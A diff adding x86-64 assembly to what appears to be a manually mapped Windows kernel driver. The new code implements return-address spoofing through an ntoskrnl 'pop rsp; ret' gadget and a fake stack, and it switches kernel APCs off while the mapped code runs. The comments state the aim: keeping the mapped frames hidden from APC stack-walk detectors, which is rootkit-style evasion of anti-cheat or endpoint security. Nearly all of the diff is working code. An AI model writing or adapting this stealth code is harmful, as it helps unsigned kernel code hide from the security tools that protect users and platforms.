@@ -157,6 +157,92 @@ PostboxMmCopySpoof:
     movq %r11, %rsp
     jmp *g_PostboxMmCopyTarget(%rip)
 
+# APC-stackwalk clean wait. The caller (PostboxThreadLoop) calls this with the
+# Windows x64 ABI: rcx = target (KeDelayExecutionThread), rdx = Alertable,
+# r8 = WaitMode, r9 = Interval. The target runs on a fake stack below the
+# caller's RSP; its return address is an nt `pop rsp; ret` gadget and the real
+# RSP lives on the fake stack, not in a global. While the target blocks, a
+# stack walk sees the nt gadget and the fake frame, not the mapped return slot
+# of the caller.
+    .globl PostboxCleanWait
+PostboxCleanWait:
+    movq %rsp, %r10                 # real RSP (points at caller return slot)
+    leaq -0x100(%rsp), %r11
+    andq $-16, %r11
+    subq $8, %r11                   # fake RSP, 16-byte aligned
+    movq g_PostboxPopRspRet(%rip), %rax
+    testq %rax, %rax
+    jz 1f
+    movq %rax, 0(%r11)              # target return = nt pop rsp; ret
+    movq %r10, 8(%r11)              # pop rsp loads the real RSP
+    movq %r11, %rsp
+    jmp *%rcx
+1:
+    # Gadget unresolved: keep the wait functional. The caller only selects the
+    # clean-wait loop when g_PostboxPopRspRet is nonzero.
+    jmp *%rcx
+
+# APC-stackwalk thread loop. The mapped work is a step function that returns
+# 1 to continue or 0 to stop. APCs are disabled while the step runs, so a
+# detector cannot capture its mapped frames. The wait is called directly from
+# this stub through PostboxCleanWait; there is no C wrapper frame left on the
+# stack while the target blocks.
+#
+# Context (all qwords):
+#   0x00 State
+#   0x08 Step
+#   0x10 WaitTarget
+#   0x18 WaitInterval (LARGE_INTEGER, 100 ns units)
+#   0x20 EnterCritical
+#   0x28 LeaveCritical
+    .globl PostboxThreadLoop
+PostboxThreadLoop:
+    pushq %rbx
+    pushq %r12
+    pushq %r13
+    subq $0x30, %rsp                # 3 pushes + 0x30 keeps calls 16-byte aligned
+    movq %rcx, %rbx
+    movq 0x00(%rbx), %r12
+    movq 0x08(%rbx), %r13
+
+    # Keep kernel APCs out of the first mapped step.
+    movq 0x20(%rbx), %rax
+    testq %rax, %rax
+    jz 1f
+    call *%rax
+1:
+    movq %r12, %rcx
+    call *%r13
+    testl %eax, %eax
+    jz 9f
+
+    # The step has returned, so its mapped frames are gone. Enable APCs only
+    # for the clean wait; the wait itself hides its mapped return address.
+    movq 0x28(%rbx), %rax
+    testq %rax, %rax
+    jz 2f
+    call *%rax
+2:
+    movq 0x10(%rbx), %rcx
+    xorl %edx, %edx
+    xorl %r8d, %r8d
+    leaq 0x18(%rbx), %r9
+    call PostboxCleanWait
+
+    # Back in mapped code: disable APCs before the next step.
+    movq 0x20(%rbx), %rax
+    testq %rax, %rax
+    jz 1b
+    call *%rax
+    jmp 1b
+
+9:
+    addq $0x30, %rsp
+    popq %r13
+    popq %r12
+    popq %rbx
+    ret
+
 # Test-only probe target: records the return address it was entered with. When
 # called through the shadow thunk, this is the nt jump gadget.
     .globl PostboxStackProbeTarget
